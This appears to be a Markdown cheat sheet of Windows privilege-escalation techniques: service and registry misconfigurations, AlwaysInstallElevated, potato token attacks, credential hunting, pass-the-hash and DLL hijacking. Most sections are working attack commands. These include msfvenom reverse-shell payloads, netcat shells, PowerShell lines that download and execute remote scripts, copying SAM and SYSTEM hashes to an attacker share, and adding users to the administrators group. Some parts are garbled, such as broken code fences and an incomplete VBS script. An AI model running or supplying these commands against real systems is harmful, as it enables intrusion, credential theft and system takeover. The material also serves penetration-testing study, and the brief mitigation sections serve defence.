- [Get information about Windows machine](#Get-information-about-Windows-machine)

- [Registry Always InstallElevated](#Registry-Always-InstallElevated)
- [Registry Autorun](#Registry-Autorun)
- [Weak Registery Permissions](#Weak-Registery-Permissions)

- [Insecure Service Permissions](#Insecure-Service-Permissions)
- [Service escalation](#Service-escalation)
- [Insecure Service Executables](#Insecure-Service-Executables)

- [Unquoted Service Paths](#Unquoted-Service-Paths)
- [binPath](#binPath)
- [Hot Potato](#HotPotato)

- [Stored Password](#Stored-Password)
  - [Password Registry](#Password-Registry)
  - [Stored credentials](#Save-credentials)
  - [Security Account Manager](#Security-Account-Manager)
  - [Pass the hash](#Pass-the-hash)

- [Kernel Exploits](#Kernel-Exploits)
- [Startup Applications](#Startup-Applications)
- [Autorun Programs](#AutoRun Programs)
- [Scheduled tasks](#Scheduled-tasks)
- [Token Impersonation](#Token-Impersonation)
  - [Rogue Potato](#Rogue-Potato)
  - [Juicy Potato](#Juicy-Potato)
  - [PrintSpoofer](#PrintSpoofer)
- [Insecure GUI Apps](#Insecure-GUI-Apps)
- [RunAs](#RunAs)
- [DLL Hijacking](#DLL-Hijacking)
- [getsystem](#getsystem)
- [Executable Files](#Executable-Files)
- [Powershell](#Powershell)
- [Automated Tools](#Automated-Tools)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Get information about Windows machine

- Check host name
```
>hostname
```

- Check host architecture
```
>wmic OS get OSArchitecture
```

- Check information about a computer and  operating system,  operating system configuration, security information
```
>systeminfo
[...]
>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
[...]
```

- Check username
```
>echo %username%
```

- Displays user, group and privileges information for the user who is currently logged on to the local system
```
>whoami
[...]
>whoami /priv
[...]
>whoami /groups
[...]
```

- Adds modifies user accounts or displays user account information.
Applies To: Windows Server 2003, Windows Vista, Windows Server 2008, Windows Server 2003 R2, Windows Server 2000, Windows Server 2012, Windows Server 2003 with SP1, Windows 8
```
>net users
[...]
>net user <user_name>
[...]
>net localgroup
[...]
>net localgroup administrators
[...]
```

### Info about network interfaces and routing table

- Displays all current TCP/IP network configuration
```
>ipconfig /all
```

- Displays and modifies the entries in the local IP routing table
Applies To: Windows Server 2003, Windows Vista, Windows XP, Windows Server 2008, Windows 7, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2000, Windows Server 2012, Windows 8
```
>route print
```

- Displays and modifies entries in the Address Resolution Protocol
Applies To: Windows 7, Windows Server 2008 R2, Windows Server 2012, Windows 8
```
>arp -A
```

### Info about antivirus and firewall

- Communicates with the Service Controller and installed services.

Applies To: Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, Windows Server 2003 with SP2, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8

- Check windows defender status
```
>sc query windefend
```

- Check all services status
```
>sc queryex type= service
```

- Check firewall status
```
>netsh advfirewall firewall dump
[...]
>netsh firewall show state
[...]
>netsh firewall show config
[...]
```

### Read hidden files
```
gci -force
```


-------------------------------------------------------------------------------------------------------------------------------
# Registry Always InstallElevated

AlwaysInstallElevated is a setting in the Windows operating system that allows non-administrative users to install software with elevated privileges. By default, only users with administrative privileges are able to install software on a Windows system. However, when the AlwaysInstallElevated setting is enabled, non-administrative users can bypass this restriction and install applications as if they had administrative rights.

Step One - Check registry keys
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Important: Value 0x1 means that the AlwaysInstallElevated policy is enabled**

**Alternative One: Check registry with PowerUp**
```
cmd>powershell -ep bypass
ps>. .\PowerUp.ps1
ps> Invoke-AllChecks
```

**Alternative One: Check registry with WinPEAS**
```
winPEAS.exe
```

If you got an error like "ERROR: The system was unable to find the specified registry key or value." this means this registry values never created. So, the policy is not enabled. 

**Create MSI Package with msfvenom**
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<local_ip_address> lport=<local_port> –f msi > malicious.msi
```
**Transfer malicious file to the widnows machine**
```

**Add correct permission 
```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```
add correct permissions to the malicious
```

Step Two - Run the installer to trigger a reverse shell
```
msiexec /quiet /qn /i <path/to/msi/file>
```
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Insecure Service Permissions

In the context of the Windows operating system, insecure service permissions refer to a security vulnerability where services have misconfigured or overly permissive permissions, allowing unauthorized access or actions. Windows services are background processes that provide specific functionality to the operating system or applications.

At the begining check which services have permissions for logged "user" for instance **RW** persmission.

**Enumerate potentially vulnerable services**

Step zero - Identifying services with weak permissions or services that could be exploited
```
winPEAS.exe servicesinfo
```

*It is important to notice, you have to manualy check service permission, because winpeas can incorrectly print the output* 

Step one
```
accesschk64.exe /accepteula -uwcqv <username> <service_name>

for instance: accesschk.exe /accepteula -uwcqv user daclsvc
```

Step two

Important part of output is the SERVICE_START_NAME value
```
sc qc <service_name>

for instance: sc qc daclsvc
```

**Create msfvenom payload**
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```

**Add permission to malicious file**
```
icacls <malicious file path> /grant Everyone:F
```

Step three

Modify the service config and set the BINARY_PATH_NAME (binpath) to the malicious.exe file you've just created:
```
sc config <service-name> binpath="\"<malicious exe file path>\""
```

Step four

Start service
```
sc start daclsvc
```

### Mitigation
1. Principle of least privilege: Ensure that services are granted only the necessary permissions required for their functionality. Avoid running services with excessive privileges or system-level access if not required.
2. Service isolation: Run each service under a dedicated user account with restricted privileges. This helps contain the impact of potential service compromises and prevents unauthorized access to other system resources.
3. Regular security updates: Keep the operating system, software, and services up to date with the latest security patches. This helps address known vulnerabilities and reduces the risk of exploitation.
4. Access controls and firewall rules: Configure appropriate access controls, including user permissions and firewall rules, to restrict access to services and prevent unauthorized interactions.
5. Monitoring and auditing: Implement monitoring and logging mechanisms to detect suspicious activity or unauthorized access attempts. Regularly review logs for signs of security incidents or policy violation

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Weak Registery Permissions

Weak registry permissions in the Windows operating system refer to security vulnerabilities caused by misconfigured or overly permissive access controls on registry keys. The Windows Registry is a centralized database that stores configuration settings, options, and other system information.
When registry keys have weak permissions, it means that unauthorized users or processes can access, modify, or delete those keys, potentially compromising the integrity and security of the system.

**Enumerate potentially vulnerable services**

Step zero - Identifying services with weak registery permissions that could be exploited
```
winPEAS.exe servicesinfo
```

*It is important to notice, you have to manualy check registery permission, because winpeas can incorrectly print the output* 

Step one - Query teh service
```
sc qc <service_name>

for instance: sc qc regsvc
```

Step two - Check register permissions, the particular register we can get from the winpeas output
```
accesschk.exe /accepteula -uvwqk <register_path>

for instance: accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

**Create msfvenom payload**
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o malicious.exe
```

**Add permission to malicious file**
```
icacls <malicious file path> /grant Everyone:F
```

Step four - Overwrite the ImagePath registry key
```
reg add <register_path> /v ImagePath /t REG_EXPAND_SZ /d <malicious exe path> /f

for instance: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

Step five - start the service
```
net start <service_name>
```

### Mitigation
1. Principle of least privilege: Assign the minimum necessary permissions to registry keys. Restrict access to critical keys only to authorized users or system accounts.
2. Regular audits: Perform periodic audits of registry key permissions to identify any misconfigurations or overly permissive settings. Tools like AccessChk or PowerShell can help analyze and verify registry permissions.
3. Secure default permissions: Ensure that default permissions for system-critical registry keys are secure and adhere to industry best practices. Avoid granting unnecessary privileges to default users or groups.
4. Access control lists (ACLs): Use ACLs to control access to registry keys. Assign permissions based on user accounts, security groups, or predefined Windows security principals.
5. System hardening: Implement security measures like disabling unnecessary services, enabling auditing, and configuring Group Policy settings to restrict unauthorized access to registry keys


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Unquoted Service Paths

When service path is not between quotation marks and we have write permission in one of the intermediate folders. We have an issue.

**Enumerate potentially vulnerable services**

Step zero - Identifying Unquoted Service Path that could be exploited
```
winPEAS.exe servicesinfo
```
*It is important to notice, you have to manualy check Unquoted Service Paths, because winpeas can incorrectly print the output* 

Step one - Query teh service

```
sc qc <service_name>

for intance: sc qc unquotedsvc
```

Step two - To check it is possible to add executable file in to the service path (**We need RW permission**)
```
accesschk.exe /accepteula -uwdq "<path>"
```

**Create malicious file**
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o <same_as_servic>.exe
[...]
OR
[...]
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o <same_as_service>.exe
```

**Add permission to malicious file**
```
icacls <malicious file path> /grant Everyone:F
```

Step three - Place malicious file in the Windows OS(Some part of Unquoted Path)

Step four - Run service
```
net start <service_name>

for instance: unquotedsvc
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## AutoRun Programs

Autoruns is a powerful utility for Windows developed by Microsoft that allows users to view and manage the programs, processes, services, drivers, and other components that automatically run or start when the operating system boots up.

Step One - Check registry for AutoRun executables
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

**Alternative One** - Check with PowerUp
```
cmd>powershell -ep bypass
ps>. .\PowerUp.ps1
ps> Invoke-AllCheck
```

**Alternative Two** - Check with WinPEAS
```
WinPEAS.exe

Section Autorun Applications
```

Step two - Check autorun executables permission
```
accesschk64.exe /accepteula -wvu "/autorun/file/path"
```

Step three - Create malicious file
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<your_ip> -f exe -o reverse.exe
```

**Copy program.exe to windows machine**

**Modify malicious file permission**
```
icacls <you/mlaicious/file/path /grant Everyone:F
```

- Place program.exe in auto run directory, and remember to change the name on the file
```
for instance: copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

-------------------------------------------------------------------------------------------------------------------------------
# binPath

### Searching (CMD)
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```
- Check have we got permission **SERVICE_CHANGE_CONFIG**

### Exploitation(CMD)
- One
```
sc config daclsvc binpath= "net localgroup administrators <user_name> /add"
```

- Two
```
sc start daclsvc
```

- Three
```
type: net localgroup administrators
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Hot Potato

Windows privilege escalation technique. This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012

### Run powershell
```
powershell.exe -nop -ep bypass
```

### Get and Import powershell module
```
Import-Module C:\Tater.ps1
```

### Type in powershell
```
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

### Confirm attack prompt
```
net localgroup administrators
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Stored Password

Identifying passwords with winpeas
```
winPEAS.exe windowscreds
```

## Password Registry

Search registry for key and value contains the word "password"
```
reg query HKLM /f password /t REG_SZ /s
```

Search for admin autologon credentials
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

Search password in specific registers

*VNC*
```
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

*Windows autologin*
```  
reg query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

*SNMP Parameters*
```  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

*Putty*
```
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
```

*Other*
``` 
reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s
```

## Stored credentials

Search password with find command
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password Groups.xml
findstr /si password *.ini
findstr /si password *.ini *.txt **config
```

List saved credentails
```
cmdkey /list
```

Search passwords in config files
```
dir /s *pass* == *cred* == *vnc* == *config*
```

Search password in all files
```
findstr /spin "password" *.*
```

Search password in common config file
```
C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```


- Get passwords form dump file(firefox example)
Get procdump binary
[https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)


- Privesc, send reverseshell and run listener on Kali. Run
```
runas /savecred /user:admin C:\malicious.exe
```

## Security Account Manager

SAM and SYSTEM files can be used to extract user password hashes

- Copy SYSTEM and SAM files 
```
copy C:\Windows\Repair\SAM \\<your_ip\<smb_share>\
copy C:\Windows\Repair\SYSTEM \\<your_ip>\<smb_share>\
```

- Use creddump7
```
python3.9 /opt/impacket/examples/secretsdump.py -sam <sam_fiel> -system <system_file> LOCAL
```

- Crack NTLM Hash
```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

## Pass the hash

(Remember the full hash includes both the LM and NTLM hash, separated by a colon)
```
pth-winexe -U 'admin%hash' //<MACHINE_IP> cmd.exe

python3.9 /opt/impacket/examples/psexec.py -hashes <hash> <user_name>@MACHINE_IP
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Kernel-Exploits

### Windows kernel exploits resources
[Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Discovery of missing patches
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Metasploit
Module which can quickly identify any missing patches based on the Knowledge Base number and specifically patches for which there is a Metasploit module.
```
msf> use post/windows/gather/enum_patches

set SESSION X

set KB "KB2534111","KB2641251"

run
```

### Windows Exploit Suggester
- On windows machines copy output 
```
systeminfo
```

- Run winodows-exploit-suggester.py --database yourdatabase.xls --systeminfo windows_info.txt

### Powershell
- Use Sherlock script
```
Import-Module C:\Sherlock.ps1
```
- Run Find-AllVulns
```
Find-AllVulns
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Insecure Service Executables

Step zero - Identifying services with weak registery permissions that could be exploited
```
winPEAS.exe servicesinfo
```

*It is important to notice, you have to manualy check registery permission, because winpeas can incorrectly print the output* 

Step one - Query teh service
```
sc qc <service_name>

for instance: sc qc filepermsvc
```

Step two - Check the service
```
accesschk.exe /accepteula -quvw "<service_path>"

for instance: accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

### Check binary service
```
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Step Two - Create vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
oLink.TargetPath = "<you\malicious\exe\path"
oLink.save
```

**Create msfvenom payload**
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o <service_name>.exe
```

**Add permission to malicious file**
```
icacls <malicious file path> /grant Everyone:F
```

**Copy malicious file to service_path, and rename original service file**

### Start service
```
net start <service_name>
for instance: net start filepermsvc
```

-------------------------------------------------------------------------------------------------------------------------------

# Startup Applications

Step One: Check startup applications

**Possibility one**
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

**Possibility two**
```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

**Create malicious file**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip_address> -f exe -o malicious.exe
```

Step three -  run vbs script
```
cscript <path/to/vbs/script.vbs
```

-------------------------------------------------------------------------------------------------------------------------------
# Scheduled tasks

**View all existing tasks**
```
schtasks /query /fo LIST /v 
```
  
**Findstr utility can be used tyo search certain text**
```
schtasks /query /fo LIST /v | findstr /v "\Text"
```

Step One - Check file permissions
```
.\accesschk.exe /accepteula -quvw stef <file/path>
```

**Create malicious payload**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
```
  
- Override schtasks file
```
Remember, depends on the situation
  
For instance: echo "path_to_malicious_shell" >> "C:\Users\Administrator\Desktop\Backup.ps1"
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Token Impersonation

## Hot Potato
This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012

## Juicy Potato
#### Attack Requirements
- User account usually a service account with the impersonation privileges of SeImpersonatePrivilege or/and SeAssignPrimaryTokenPrivilege enabled.
- A COM server with a unique CLSID:
```
http://ohpe.it/juicy-potato/CLSID/
```

#### Exploitation
- Check SeImpersonatePrivilege is Enable
```
>whoami /priv
```
- download binary
```
https://github.com/ohpe/juicy-potato/releases
```
- upload binary
```
powershell "IEX(New-Object Net.WebClient).downloadFile('http://[ip_address]/JuicyPotato.exe', c:\J.exe')" -bypass executionpolicy
```
- To run the tool, we need a port number for the COM server and a valid CLSID
We can either use the provided list by the tool authors based on the version of the system or run the below PowerShell command to extract the CLSID of the current system.
![image](https://user-images.githubusercontent.com/49185097/122955725-590f0b00-d34e-11eb-919d-b15c10f32188.png)
- Run script
```
powershell -executionpolicy bypass -file GetCLSID.ps1 > clsid.txt
```
- Create bat file
```
c:\Users\test\nc.exe -e cmd.exe <ip> <port> > my.bat
```
- Run juicypotato.exe
```
J.exe -p c:\Users\test\my.bat -l 9003 -t * -c {CLSID from the extracted list}

-l <same as the one in the bat file>
```

## Rogue Potato
- Check SeImpersonatePrivilege status (is enable?)
```
whoami /priv
```
- Run RogueWinRM.exe
- For running an interactive cmd
```
Run RogueWinRM.exe -p C:\windows\system32\cmd.exe
```
- For running netcat reverse shell
```
RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "<IP> <PORT> -e cmd"
```

**Token Impersonation Overview**

What are tokens
- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file.

Types:
- Impersonate - *non-interactive* such as attaching a network drive or a domain logon script
- Delegate - Created for logging into a machine or using RDP

```
meterpreter> impersonate_token marvel\\fcastle
meterpreter> shell
whoami
```

Attempt to dump hashes as non-Domain Admin

![image](https://github.com/dar3k93/Post-exploitation/assets/49185097/b89e6612-37b5-4b54-b222-6e463d35a2df)

Token Impersonation - Identify Domain Admistrator

List tokens
```
meterpreter> list_tokens -u
meterpreter> impersonate_token MARVEL\\administrator
meterpreter> shell
whoami
```

Now we can attempt to dump hashes as Domain Admin

**Impersonation Privileges Overview**
Check privileges information
```
whoami /priv
or
meterpreter> getprivs
```
We have to remember to check each privilage in case of abuse (For example SeImpersonatePrivilege)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)

**Potato Attacks Overview**
- [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
- [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

**Alternate Data Stream**
- [https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)

  
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## PrintSpoofer

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  
# Insecure GUI Apps

Step One - Check running programs
```
tasklist /V |

tasklist /V | findstr <app.exe>
```
  
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  
# RunAs
Allows us to run a command as somebody else.

- Check runas /list
```
cmdkey /list
```
- Run command as Windows administrator
Run runas (use Administrator access and with that access run the same credentials and run cmd.exe)
```
cmd> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>reverse.ps1')"
[...]Other possibility[...]
cmd> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe c/ TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.tx
```

- Run exe as admin
```
runas /savecred /user:admin C:\reverse.exe
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Service escalation

## Service registry
- Check which user has controll over registers
```
cmd> powershell -ep bypass
ps> Get-Acl -Path hklm:\Sytem\CurrentControlSet\services\regsvc | fl
```
Check if output suggest that user belong to "NT AUTORITORY \INTERACTIVE" has fullcontrol permission over the registers key
```
NT AUTORITORY \INTERACTIVE Allow FullControl
```
In case we have full control over register key, we can compile maliicious file. Copy C:\Users\User\Desktop\Tools\Source\windows_service.c to your kali machine.
 
- Transfer C file
On kali machine run pyftpdlib
```
python -m pyftpdlib -p 21 --write
```
     
On windows machine 
```
cmd> ftp <kali_ftp_ip>
>anonymous
>anonymous
>put <file_name>.c     
```  

Edit C file(In C file is important to change system command.)
+ Compilation process     
```
> sudo apt install gcc-mingw-w64
[...]
> x86_64-w64-mingw32-gcc <file.c> -o x.exe
```

+ Copy exe to the windows machine
+ Place x.exe in 'C:\Temp'

+ In command prompt type:
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
+ In command line type:
```
sc start regsvc
```
+ Check is the user in admin group
```
net localgroup administrators
```
     
## Service Permission
- Registry enumeration

(PowerUp.ps1) Check Registry permission
```
cmd>powershell -ep bypass
ps>. .\PowerUp.ps1
ps>Invoke-AllChecks
```
     
(accesschk64.exe) Check which services we have permissions for logged in users
```
accesschk64.exe -uwcqv "user" *

example output

RW daclsvc
[...]
```
- Exploitation
     
If we have permissions on the service we can change the the executable file location on the target system with malicious one. 
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o common.exe
```
 
We can change the service executable file in the PATH
```
sc config <service_name> binpath="c:\users\user\tmp\common.exe
```
Check new path
```
sc qc <service_name>
```
     
setup curect multi/handler in metasploit

run service
```
net start daclsvc
```
     
-------------------------------------------------------------------------------------------------------------------------------
# DLL Hijacking
Description:
When windows operation system run service or application look's for dll's and if dll does not exist we can set malicious dll. We have to check the path is writeable and dll does not exists.     
  
- Searching process
Run process monitor

You can add filter conditions
+ Result is NAME NOT FOUND then
+ Path ends with .dll then Include
'''
     
Start and stop service via commandline
+ sc start <service_name>
+ sc stop <service_name>

Create malicious dll file
```
x86_64-w64-mingw32-gcc your_file_name .c -shared -o your_file_name.dll
```

Start and stop dllsvc
```
sc stop <service_name> & sc start <service_name>
```
     
     
-------------------------------------------------------------------------------------------------------------------------------
# Getsystem
     
In metasploit we have command. Type getsystem and magically Meterpreter elevates you from a local administrator to the SYSTEM use
```
getsystem
```
     
-------------------------------------------------------------------------------------------------------------------------------
# Executable Files

- Search for executable files with PowerUp
```
cmd> powershell -ep bypass
ps> . .\PowerUp.ps1
ps> Invoke-AllChecks     
```

- Check services privileges
```
sc qc <service_name>
```
- Use accesschk.exe for check service
```
C:\PrivEsc\accesschk.exe /accepteula -quvw "<C:\Program Files\File Permissions Service\service_name.exe>"
```
- Replace exe with malicious exe 

- start malicious exe   
```
sc start malicious_exe
```
     
-------------------------------------------------------------------------------------------------------------------------------     
# Powershell

## Useful scripts
- [https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)
- [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

## Download file with powershell
```
powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/testfile'))"
```

## Command breakdown
```
powershell.exe -nop -ep bypass -c "<Command>"

-nop or NoProfile : Currently active user’s profile will not be loaded.
-ep bypass or -ExecutionPolicy Bypass : Execution Policy restricts script execution on most systems on the default setting. This can be overcome by giving Bypass value to the value of -ExecutionPolicy parameter.
-c or -Command : Specify a command to be executed.
```

## Invoke-PowerShellTcp.ps1 reverse shell
```
powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))
```

--------------------------------------------------------------------------------------------------------------------------------------
# Tools

- PowerShell
[Sherlock](https://github.com/sherlock-project/sherlock)
[PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)
[jaws-enum](https://github.com/411Hall/JAWS)

- Executables
[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
[Seatbelt](https://github.com/GhostPack/Seatbelt)
[Watson](https://github.com/rasta-mouse/Watson)
[SharpUp](https://github.com/GhostPack/SharpUp)
  
- Others
[exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
[exploit suggester (local)](https://github.com/mzet-/linux-exploit-suggester)


### References
- [https://academy.tcm-sec.com/courses/](https://academy.tcm-sec.com/courses/)


